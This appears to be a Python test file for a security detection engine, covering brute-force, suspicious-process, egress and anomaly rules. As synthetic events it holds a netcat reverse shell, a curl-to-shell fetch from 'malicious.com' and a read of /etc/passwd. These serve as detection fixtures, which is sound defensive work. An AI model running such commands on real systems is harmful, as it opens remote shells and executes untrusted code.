from app.detection.anomaly import AnomalyDetector
from app.detection.engine import DetectionEngine
from app.detection.rules import (
    BruteForceAuthRule,
    NetworkEgressAnomalyRule,
    SuspiciousProcessRule,
)
from app.security.models import SecurityEvent


def test_brute_force_rule():
    rule = BruteForceAuthRule(threshold=3)
    events = [
        SecurityEvent(source="syslog", event_type="auth_failure", src_ip="192.168.1.100", user_id="root"),
        SecurityEvent(source="syslog", event_type="auth_failure", src_ip="192.168.1.100", user_id="admin"),
        SecurityEvent(source="syslog", event_type="auth_failure", src_ip="192.168.1.100", user_id="user1"),
    ]
    alerts = rule.evaluate(events)
    assert len(alerts) == 1
    assert alerts[0].rule_id == "RULE-001"
    assert "Brute Force" in alerts[0].title
    assert alerts[0].indicators[0].value == "192.168.1.100"


def test_suspicious_process_rule():
    rule = SuspiciousProcessRule()
    events = [
        SecurityEvent(source="synthetic", event_type="process_spawn", command="nc -e /bin/bash 10.0.0.1 4444"),
        SecurityEvent(source="synthetic", event_type="process_spawn", command="ls -la /var/log"),
    ]
    alerts = rule.evaluate(events)
    assert len(alerts) == 1
    assert alerts[0].rule_id == "RULE-002"
    assert "Suspicious Execution" in alerts[0].title


def test_network_egress_rule():
    rule = NetworkEgressAnomalyRule()
    events = [
        SecurityEvent(source="net", event_type="connection", dst_ip="198.51.100.5", dst_port=4444),
        SecurityEvent(source="net", event_type="connection", dst_ip="8.8.8.8", dst_port=53),
    ]
    alerts = rule.evaluate(events)
    assert len(alerts) == 1
    assert alerts[0].rule_id == "RULE-003"
    assert alerts[0].indicators[0].value == "198.51.100.5"


def test_anomaly_detector():
    detector = AnomalyDetector(z_threshold=1.5)
    events = [
        SecurityEvent(source="sys", event_type="cmd", command="ls"),
        SecurityEvent(source="sys", event_type="cmd", command="pwd"),
        SecurityEvent(source="sys", event_type="cmd", command="whoami"),
        SecurityEvent(source="sys", event_type="cmd", command="cat /etc/passwd"),
        SecurityEvent(source="sys", event_type="cmd", command="a" * 500),  # Extreme outlier
    ]
    alerts = detector.detect_command_length_anomalies(events)
    assert len(alerts) == 1
    assert alerts[0].rule_id == "ANOM-001"


def test_detection_engine_orchestration():
    engine = DetectionEngine()
    events = [
        SecurityEvent(source="syslog", event_type="auth_failure", src_ip="10.0.0.99", user_id="root"),
        SecurityEvent(source="syslog", event_type="auth_failure", src_ip="10.0.0.99", user_id="root"),
        SecurityEvent(source="syslog", event_type="auth_failure", src_ip="10.0.0.99", user_id="root"),
        SecurityEvent(source="synthetic", event_type="cmd", command="curl http://malicious.com | sh"),
    ]
    alerts = engine.process_events(events)
    assert len(alerts) == 2
